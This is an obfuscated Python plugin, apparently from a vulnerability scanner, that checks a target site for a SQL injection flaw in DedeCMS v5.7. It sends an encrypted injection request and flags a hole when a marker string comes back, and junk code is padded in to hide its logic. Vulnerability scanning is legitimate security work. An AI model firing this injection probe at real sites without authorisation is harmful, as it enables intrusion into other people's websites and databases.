# -*- coding: utf-8 -*-
import binascii,re
import fcntl

from decode import Decoder
de_key = '2ec6a4bd513d71efdaaccb3aaf5c27487aef537f6091d14fcce0617c29dbf424'
decode = Decoder(binascii.a2b_hex(de_key)).decode
from dummy import *
from miniCurl import Curl
curl = Curl()
 #Embedded file name: dedecms_v5.7_inj.py
if 0:
    i11iIiiIii

def assign(service, arg):
    if service == '''dedecms''':
        return (True, arg)
        if 0:
            O0 / iIii1I11I1II1 % OoooooooOO - i1IIi


def audit(arg):
    o0OO00 = arg
    oo, oo, i1iII1IiiIiI1, oo, oo = curl.curl(o0OO00 + decode('X\xb4\xd2\x8c#\x04&\x9f\xef\xdc\xf7U\xd9.Qy\x08\xd6 F\x17\xeb\xe9X\xf4\xd4Y#Y\xaa\xcePY\xf1\xfa\x85&DK\xfc\xac\xde\xbd\x0b\xddeTq\r\x95k!@\xc3\xcaW\x9e\xf9:.2\xc3\xa6=6\xac\x93\xc9&\n#\xf6\xc2\xd5\xb9\x0c\xdd-\x1d\x1ac\xf7"\x08W\xe0\xa1u\xd8\xf8]f1\x80\xaf?t\xdd\xbd\xe6\x08&)\xf4\xc1\xb7\x91a\xf6G~S"\xf41ex\x87\xe94\xfe\xf6y@r\xaa\xa0v7\xde\x97\x84&K#\xf6\xc2\xfe\xd0"\xfdE~h\x15\x80#M\x16\xe5\xe6\x1d\xd7\xf83e1\xa0\xc0V\x17\xb4\xf6\xa4Ie#\xf6\xc2\xdb\xf2h\xb6DSz$\xcf\x01dx\xc3\xc8\x14\x9e\xfby'))
    if i1iII1IiiIiI1 and i1iII1IiiIiI1.find(decode('\x0e\xbd\xd6\x8c(MB\x9d\xa3\xdd\xbb\r\x8f')) != -1:
        security_hole(o0OO00)
        if 0:
            ooOoO0O00 * IIiIiII11i


if __name__ == '__main__':
    from dummy import *

#KEY---2ec6a4bd513d71efdaaccb3aaf5c27487aef537f6091d14fcce0617c29dbf424---